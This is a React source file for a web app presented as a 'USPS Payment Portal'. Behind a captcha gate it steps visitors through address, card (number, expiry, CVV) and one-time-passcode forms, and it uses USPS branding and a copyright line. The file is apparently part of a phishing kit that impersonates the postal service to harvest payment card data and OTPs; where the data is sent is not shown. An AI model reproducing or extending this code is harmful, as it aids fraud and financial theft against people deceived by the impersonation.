import React, { useState, useEffect } from 'react';
import './App.css';
import './styles/uspsStyles.css';
import CaptchaGate from './components/CaptchaGate';
import AddressForm from './components/AddressForm';
import PaymentForm from './components/PaymentForm';
import OtpForm from './components/OtpForm';

function App() {
  const [step, setStep] = useState('gate');
  const [verified, setVerified] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    country: '',
    address: '',
    zipCode: '',
    city: '',
    cardNumber: '',
    expirationDate: '',
    cvv: '',
    otp: ''
  });
  const [error, setError] = useState('');

  // Check for existing verification
  useEffect(() => {
    const isVerified = sessionStorage.getItem('captchaVerified') === 'true';
    if (isVerified) {
      setVerified(true);
      setStep('address');
    }
  }, []);

  const handleCaptchaVerified = () => {
    setVerified(true);
    setStep('address');
  };

  const nextStep = () => {
    if (step === 'address') setStep('payment');
    else if (step === 'payment') setStep('otp');
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  return (
    <div className="app-container">
      {!verified ? (
        <CaptchaGate onVerified={handleCaptchaVerified} />
      ) : (
        <div className="usps-container">
          <header className="usps-header">
            <img src="/usps-logo.png" alt="USPS Logo" className="usps-logo" />
            <h1>USPS Payment Portal</h1>
          </header>

          <main className="usps-main">
            {error && <div className="usps-error">{error}</div>}

            {step === 'address' && (
              <AddressForm 
                formData={formData} 
                handleChange={handleChange} 
                nextStep={nextStep} 
                error={error}  
                setError={setError}
              />
            )}

            {step === 'payment' && (
              <PaymentForm 
                formData={formData} 
                handleChange={handleChange} 
                nextStep={nextStep} 
                setError={setError}
              />
            )}

            {step === 'otp' && (
              <OtpForm 
                formData={formData} 
                handleChange={handleChange} 
                setError={setError}
              />
            )}
          </main>

          <footer className="usps-footer">
            <p>Â© {new Date().getFullYear()} United States Postal Service. All rights reserved.</p>
          </footer>
        </div>
      )}
    </div>
  );
}

export default App;
